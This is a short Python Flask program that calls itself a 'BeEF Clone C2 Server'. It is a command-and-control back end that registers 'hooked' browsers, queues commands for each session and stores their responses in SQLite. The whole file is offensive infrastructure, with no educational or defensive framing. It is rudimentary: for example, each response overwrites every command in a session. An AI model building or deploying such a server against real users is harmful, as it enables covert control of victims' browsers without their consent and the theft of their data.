from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)
DATABASE = 'beef_clone.db'

# Initialize database
def init_db():
    with sqlite3.connect(DATABASE) as conn:
        conn.execute('''CREATE TABLE IF NOT EXISTS sessions 
                        (id INTEGER PRIMARY KEY, browser_info TEXT, session_id TEXT)''')
        conn.execute('''CREATE TABLE IF NOT EXISTS commands 
                        (id INTEGER PRIMARY KEY, session_id TEXT, command TEXT, response TEXT)''')

@app.route('/')
def index():
    return "BeEF Clone C2 Server Running"

@app.route('/hook', methods=['POST'])
def hook_browser():
    data = request.json
    browser_info = data.get('browser_info')
    session_id = data.get('session_id')
    with sqlite3.connect(DATABASE) as conn:
        conn.execute("INSERT INTO sessions (browser_info, session_id) VALUES (?, ?)", 
                     (browser_info, session_id))
    return jsonify({"message": "Browser hooked successfully"}), 200

@app.route('/command', methods=['POST'])
def send_command():
    session_id = request.json.get('session_id')
    command = request.json.get('command')
    with sqlite3.connect(DATABASE) as conn:
        conn.execute("INSERT INTO commands (session_id, command) VALUES (?, ?)", 
                     (session_id, command))
    return jsonify({"message": "Command sent"}), 200

@app.route('/response', methods=['POST'])
def receive_response():
    session_id = request.json.get('session_id')
    response = request.json.get('response')
    with sqlite3.connect(DATABASE) as conn:
        conn.execute("UPDATE commands SET response = ? WHERE session_id = ?", 
                     (response, session_id))
    return jsonify({"message": "Response received"}), 200

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000)
